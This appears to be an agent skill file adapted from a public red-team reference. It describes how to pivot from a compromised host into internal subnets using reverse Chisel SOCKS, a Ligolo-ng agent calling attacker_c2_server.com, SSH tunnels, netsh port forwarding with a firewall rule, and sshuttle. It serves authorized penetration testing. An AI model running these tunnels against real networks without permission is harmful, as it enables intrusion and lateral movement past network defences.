---
name: redteam-pivoting
description: >-
  Pivot through internal networks: SOCKS proxies, port forwarding, SSH tunnels, Chisel, Ligolo-ng,
  Meterpreter routes and multi-hop pivoting. Use when a compromised host can reach otherwise
  unreachable subnets, when you need to tunnel tooling through a foothold, or when mapping network
  reachability during lateral movement.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "2"
  generated-by: build/build.py
---

# Network Pivoting and Tunneling

There are only three primitives: a **SOCKS proxy** (per-connection, tool-level, best for many ports
on a few hosts), a **port forward** (one port, cheapest and most reliable), and a **TUN interface**
(whole subnet, transparent to any tool including ICMP and UDP). Everything else is a transport choice
for getting that primitive through the egress path you have. Done means your tooling reaches the
target subnet at usable speed, you know exactly which hop carries the traffic, and you can tear the
tunnel down.

## When to use this skill

- The compromised host can reach a subnet your attack box cannot, and you need tools to reach it.
- You must choose between a single port forward, a SOCKS proxy and a full TUN route.
- The only egress is HTTP/WebSocket through a DMZ web server, so you need a tunnel over that
  protocol rather than a raw socket.
- You need to verify what actually crosses the pivot (capture on the pivot host) or chain a second
  hop.
- C2-native pivots (beacon `socks`, `rportfwd`, `spunnel`) are documented in `c2-frameworks`;
  credential-based lateral movement (SMB/WinRM/RDP) is `active-directory-lateral-movement`.

## First moves

1. **Reverse SOCKS5 with Chisel** — the victim dials out, so no inbound port is needed; the client
   exposes a SOCKS5 listener on your box:

   ```bash
   chisel server -p 8008 --reverse
   chisel.exe client YOUR_IP:8008 R:socks
   ```

2. **Whole-subnet routing with Ligolo-ng** — the agent dials out and the proxy creates a userland
   network stack on a TUN interface; add one route per subnet:

   ```bash
   ./proxy -selfcert
   ./agent -connect attacker_c2_server.com:11601
   ligolo-ng » session
   interface_create --name ligolo
   route_add --name ligolo --route 10.24.0.0/24
   tunnel_start --tun ligolo
   ```

3. **Native SSH tunnels when you already have SSH on the pivot** — `-D` is a SOCKS proxy, `-L` is a
   local forward; `-f -N` keeps it in the background:

   ```bash
   ssh -N -f -D 1080 user@10.10.10.10
   ssh -L 8080:10.10.10.20:80 user@10.10.10.10
   ```

4. **Drive tools through the SOCKS listener with proxychains** — the proxy list is the only config
   that matters, and DNS must be proxified explicitly:

   ```bash
   [ProxyList]
   socks5 localhost 1080
   ```

   ```bash
   proxychains nmap -sT 10.10.10.10
   proxychains curl http://10.10.10.10
   ```

5. **Windows-native single-port forward with `netsh`** — no upload needed, but it is TCP/IPv4 only
   and needs admin plus a firewall rule:

   ```powershell
   netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
   netsh advfirewall firewall add rule name="PortForwarding 3340" dir=in action=allow protocol=TCP localport=3340
   ```

6. **Transparent subnet route over SSH with sshuttle** — needs root on your side and SSH on the
   pivot, but no agent upload:

   ```bash
   sshuttle -vvr user@10.10.10.10 10.1.1.0/24
   ```

7. **Verify the pivot actually carries traffic** — capture on the pivot host before blaming the
   tooling:

   ```bash
   tcpdump -i eth0 port 22
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [pivoting-techniques.md](references/pivoting-techniques.md) | you need the primitive itself (proxy vs forward vs capture) | SOCKS version compatibility table, proxychains/Proxifier/graftcp, SSH `-L`/`-R`/`-D` and the `~C` control sequence, `netsh portproxy`, gost, plink, tcpdump and `netsh trace` capture |
| [pivoting-tools.md](references/pivoting-tools.md) | you must pick a tool for the egress path you have | tool comparison (SOCKS4/5, HTTPS, WebSocket, TUN support, OS support), wstunnel, chisel, revsocks, reGeorg, pivotnacci, Ligolo-ng, gost, sshuttle |

## Workflow

1. **State the requirement before choosing a tool.** One port on one host → port forward. Many ports
   on a few hosts, tooling that speaks SOCKS → SOCKS proxy. A whole subnet with arbitrary tools,
   ICMP, UDP or non-proxy-aware binaries → TUN route.
2. **Single port → forward.** SSH `-L` if SSH is available; `netsh portproxy` if you are on Windows
   and cannot upload; `gost -L=tcp://:2222/192.168.1.1:22` or a Chisel single forward otherwise.
   This is the most reliable primitive and the least likely to break scanning tools.
3. **Many ports → SOCKS5.** Chisel is the default when the victim can dial out
   (`server --reverse` + `client R:socks`). SSH `-D` when SSH already exists. `revsocks` when you
   want a password-protected reverse SOCKS. `wstunnel` when DPI blocks plain HTTP tunnels. reGeorg /
   pivotnacci when the only foothold is a web shell on a DMZ server.
4. **Whole subnet → TUN.** Ligolo-ng is the choice when you need transparent routing, ICMP or UDP,
   and can run the proxy with TUN privileges: it has no SOCKS interface, so add each subnet with
   `route_add`. `sshuttle` is the equivalent when SSH and root are available and you do not want to
   upload an agent. `gost` also supports a TUN listener.
5. **Pick the direction the network allows.** If the victim cannot accept inbound connections, use
   only reverse-capable variants: Chisel `--reverse`, revsocks, Ligolo-ng agent, SSH `-R`. A bind
   shell or bind forward on a filtered host will simply never connect.
6. **Pick the transport for the egress path.** HTTP/WebSocket-only egress → wstunnel or Chisel over
   TLS. Web-server-only foothold → reGeorg/pivotnacci. Raw TCP available → the plain forms above.
7. **Adapt tooling to the proxy, not the other way round.** `proxychains` works for dynamically
   linked binaries; Go binaries need `graftcp`; Windows GUI tools need Proxifier. `nmap` must run
   `-sT` through SOCKS, and DNS only resolves through the proxy when `proxy_dns` is enabled.
8. **Chain a second hop only when needed.** Each hop adds latency and a failure point; prefer adding
   routes on an existing Ligolo session over stacking proxies.

## Gotchas

- Chisel speaks SOCKS5 only (no SOCKS4), and `R:socks` requires the server to be started with
  `--reverse`. Forgetting `--reverse` is the usual reason the listener never appears.
- Ligolo-ng has **no SOCKS interface** — it is a TUN route. If your tool insists on a SOCKS proxy you
  need a different tool or an extra proxy layer. The proxy also needs TUN/root privileges on your
  side.
- SSH `-D` cannot be added to an already-established session via the `~C` control sequence; only
  `-L` and `-R` work there. Dynamic forwarding must be set at connect time.
- `proxychains` does not intercept Go binaries (static runtime, no libc socket hooks) — use
  `graftcp` for tools such as nuclei or most modern Go scanners.
- `netsh interface portproxy` is IPv4-only (`v4tov4`), forwards TCP only, and does nothing until the
  matching firewall rule exists.
- `sshuttle` is not a SOCKS proxy and is not a general-purpose pivot for scanning from arbitrary
  tools — it captures traffic via the local firewall and needs root.
- Reverse tunnels die with the process that owns them. Run them under a persistent session
  (`screen`/`tmux`), and remember that a beacon-based `socks` inherits the beacon sleep time, so set
  `sleep 0` for interactive work.
- Capture on the pivot before assuming the tunnel is broken: `tcpdump` on the pivot, or
  `netsh trace start capture=yes` and convert with `etl2pcapng.exe`. A tool that "cannot connect" is
  often just missing a route or using the wrong interface.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Tunnels
change the target's network behaviour and can be logged by the pivot host — keep them scoped to the
engagement window.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
